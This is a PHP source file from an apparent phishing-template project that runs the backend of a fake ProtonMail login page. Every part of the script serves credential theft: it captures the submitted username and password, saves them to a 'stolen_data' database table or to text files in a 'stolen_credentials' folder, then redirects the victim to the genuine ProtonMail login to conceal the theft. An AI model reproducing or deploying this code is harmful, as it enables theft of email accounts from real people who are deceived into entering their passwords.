<?php
/**
*MIT License
*
*Copyright (c) 2022 It0sh1
*Permission is hereby granted, free of charge, to any person obtaining a copy
*of this software and associated documentation files (the "Software"), to deal
*in the Software without restriction, including without limitation the rights
*to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
*copies of the Software, and to permit persons to whom the Software is
*furnished to do so, subject to the following conditions:
*
*(The above copyright notice and this permission notice shall be included in all
*copies or substantial portions of the Software.
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&*
*FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*SOFTWARE.
*/
/************************************/
# Phishingtemplates /protonmail      #
# author: It0sh1                     #
# github: https://github.com/it0sh1  #
/*************************************/

// include Config
require('conf.inc.php');

// writing class for phishing script
class Phish
{

  // make a url redirect function
  public static function urlredirect(string $url)
  {
    // set header
    header('Location: '.$url.'');
  }

  // phishing function
  public static function getPhished()
  {

    // include some variables
    GLOBAL $db_host;
    GLOBAL $db_user;
    GLOBAL $db_pass;
    GLOBAL $db_name;
    GLOBAL $use_db;
    GLOBAL $protonmail_link;

    // when victim presses login button
    if(isset($_POST['protonmail-login']))
    {

      // creating variables for our stolen input
      $protonmail_username = htmlentities($_POST['protonmail-user']);
      $protonmail_password = htmlentities($_POST['protonmail-pass']);

      // if $use_db is set to true:
      if($use_db === true)
      {

        // create a connection with database
        $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
        or die('Connection failed bitch :( ').mysqli_connect_error();

        // making sql query
        $sql = "INSERT INTO stolen_data (stolen_username, stolen_password)
        VALUES ('$protonmail_username', '$protonmail_password');";

        // when inserting sql query succeed and is true:
        if(mysqli_query($connecting, $sql) === true)
        {

          // redirect user to official login page of protonmail
          self::urlredirect($protonmail_link. '/login');
          exit; // EXIT SCRIPT

        // ON FAIL:
        } else {

          // show error #
          echo "Something went very wrong :(. Check the error: ".mysqli_connect_error();
        }

      // when $use_db is normally set to false:
      } else {

        // making a folder for stolen user credentials
        $stolen_user_credential_folder = "stolen_credentials/";

        // check if stolen_credentials folder not exists
        if(!is_dir($stolen_user_credential_folder))
        {
          // make folder
          mkdir($stolen_user_credential_folder);

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // now we making filehandler to put our credentials in it
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Username/Email: " . $protonmail_username . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $protonmail_password . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to official protonmail login
          self::urlredirect($protonmail_link . '/login');
          exit; // EXIT SCRIPT

        // when folder does exists
        } else {

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // making filehandler again
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Username/Email: " . $protonmail_username . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $protonmail_password . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to official login page
          self::urlredirect($protonmail_link . '/login');
          exit; // EXIT SCRIPT
        }
      }
    }
  }
}

// call class and function
Phish::getPhished();
?>
